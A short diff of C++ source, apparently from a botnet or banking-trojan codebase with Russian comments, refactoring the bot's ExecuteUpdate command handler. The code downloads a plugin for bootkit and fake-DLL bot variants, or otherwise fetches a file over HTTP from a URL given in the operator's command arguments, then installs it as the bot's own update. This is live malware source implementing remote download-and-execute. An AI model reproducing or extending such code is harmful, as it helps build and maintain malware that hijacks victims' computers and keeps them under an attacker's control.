@@ -740,56 +740,40 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	// Загрузить обновление
-	PCHAR FileName = File::GetTempNameA();
-	if (!FileName) return false;
-
-	//  Для фэкедлл и буткита ссылку игнорируем, загружаем плагин
-	string PluginName;
-	if (BOT::GetBotType() == BotFakeDll || BOT::GetBotType() == BotBootkit)
-		PluginName = GetStr(EStrBotPlug);
-
-
-
-	// Загружаем обновление
-	bool Result = false;
-	TBotFileStream File(FileName, fcmCreate);
-
-	if (!PluginName.IsEmpty())
-	{
-        DWORD Size = 0;
-		LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
-		if (Buf)
+	#ifdef BOTPLUG
+		//  Для фэкедлл и буткита ссылку игнорируем, загружаем плагин
+		if (BOT::GetBotType() == BotFakeDll || BOT::GetBotType() == BotBootkit)
 		{
-			Result = true;
-			File.Write(Buf, Size);
-            MemFree(Buf);
-        }
-	}
-	else
-	{
+			string PluginName = GetStr(EStrBotPlug);
+		    DWORD Size = 0;
+			LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
+			if (Buf)
+			{
+				bool Result = BOT::UpdateBotPlug(Buf, Size);
+				MemFree(Buf);
+				return Result;
+			}
+		}
+
+		return false;
+	#else
+		PCHAR FileName = File::GetTempNameA();
+		if (!FileName) return false;
+
+		// Загружаем обновление
+		TBotFileStream File(FileName, fcmCreate);
+
 		THTTP HTTP;
-        Result = HTTP.Get(Args, &File);
-    }
+		bool Result = HTTP.Get(Args, &File);
 
-	File.Close();
+		File.Close();
 
-	if (Result)
-		Result = BOT::MakeUpdate(FileName, true);
+		if (Result)
+			Result = BOT::MakeUpdate(FileName, true);
 
-//	if (FileName)
-//	{
-//		if (DownloadInFile(Args, FileName ) && (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
-//		{
-//			/* TODO : Исправить временное решение с преобразованием в анси строку */
-//			PCHAR Name = WSTR::ToAnsi(FileName, 0);
-//			Result = BOT::MakeUpdate(Name, true);
-//			STR::Free(Name);
-//		}
-//	}
-
-
-	STR::Free(FileName);
-	return Result;
+		STR::Free(FileName);
+		return Result;
+	#endif
 }
 
 
